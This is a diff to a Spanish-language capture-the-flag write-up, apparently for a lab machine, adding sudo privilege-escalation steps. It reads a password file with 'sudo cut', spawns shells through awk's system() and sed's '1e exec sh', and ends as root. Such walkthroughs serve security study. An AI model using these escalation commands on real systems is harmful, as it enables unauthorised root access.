@@ -55,7 +55,7 @@ export TERM=xterm
 export SHELL=bash
 ```
 
-Aremos un sudo -l, podemos ver que podremos ejecutar con el usuario Bobby el comando dpkg
+Aremos un sudo -l, podemos ver que podremos ejecutar con el usuario Bobby el comando dpkg usaremos (https://gtfobins.github.io/) como guia 
 
 <img width="1154" height="374" alt="image" src="https://github.com/user-attachments/assets/9bec57db-b3f8-4c8c-8e21-710d722e67bb" />
 
@@ -82,3 +82,31 @@ comprovamos que ya tenemos la conexion con gladys
 
 <img width="832" height="148" alt="image" src="https://github.com/user-attachments/assets/f7c6e505-1a26-4ff0-9b7f-813afe8a52bd" />
 
+veremos que podemos ejecutar cut, antes de hacerlo, vamos a darle un revisada a /opt veremos un archivo llamado chocolatitocontraseña.txt
+
+para descomprimirlo usaremos cut nos mostrara el contendio del archivo de la siguiente manera
+
+```ruby
+sudo -u chocolatito  /usr/bin/cut -d "" -f1 "/opt/chocolatitocontraseña.txt"
+chocolatitopassword
+```
+Hacemos un sudo  chocolatito y pondremos su password -> chocolatitopassword
+
+<img width="1039" height="91" alt="image" src="https://github.com/user-attachments/assets/51bb19d4-b691-4356-9e1b-6b9bf026a86d" />
+
+vemos que el usuario theboos veremos que podemos usar awk, Usaremos el siguiente comando para saltar al theboos 
+
+```ruby
+  sudo -u theboss /usr/bin/awk 'BEGIN {system("/bin/bash")}'
+```
+Ahora podremos pivotear al usuario root 
+
+<img width="1038" height="101" alt="image" src="https://github.com/user-attachments/assets/ede7ec2b-5ab5-4d6e-a3b7-2b774b847cd2" />
+
+Usaremos lo siguiente:
+
+```ruby
+sudo -u root /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
+```
+Veremos que ya somos usuario root
+<img width="791" height="74" alt="image" src="https://github.com/user-attachments/assets/af3efff2-6198-4af3-bbf3-84e71be9e8bb" />
